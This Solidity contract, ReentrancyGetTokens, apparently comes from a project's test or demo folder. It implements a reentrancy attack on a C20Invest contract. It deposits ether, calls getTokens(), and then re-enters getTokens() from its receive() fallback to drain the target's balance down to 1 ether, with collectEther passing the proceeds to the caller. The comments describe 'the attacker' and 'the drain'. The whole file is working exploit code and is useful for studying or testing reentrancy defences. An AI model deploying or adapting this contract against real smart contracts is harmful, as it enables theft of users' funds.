// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.7.0;

import "../C20Invest.sol";

contract ReentrancyGetTokens {
    C20Invest public c20Invest;
    
    constructor(address c20InvestAddress) {
        c20Invest = C20Invest(payable(c20InvestAddress));
    }
    
    /// @dev This function creates an ether balance for this contract
    /// within the C20Invest contract. The attacker must wait for
    /// a price update after calling this function.
    function depositFunds() public payable {
        c20Invest.buy{value: msg.value}();
    }
    
    /// @dev The function which initiates the attack. Must be called
    /// after a C20 price update event.
    function attackC20Invest() public payable {
        c20Invest.getTokens();
    }
    
    function collectEther() public {
        msg.sender.transfer(address(this).balance);
    }
    
    /// @dev The receive function is triggered upon receipt of the
    /// ether refund from the C20Invest. getTokens() is then called
    /// again to repeat the drain.
    receive () external payable {
        if(address(c20Invest).balance >= 1 ether){
            c20Invest.getTokens();
        }
    }
}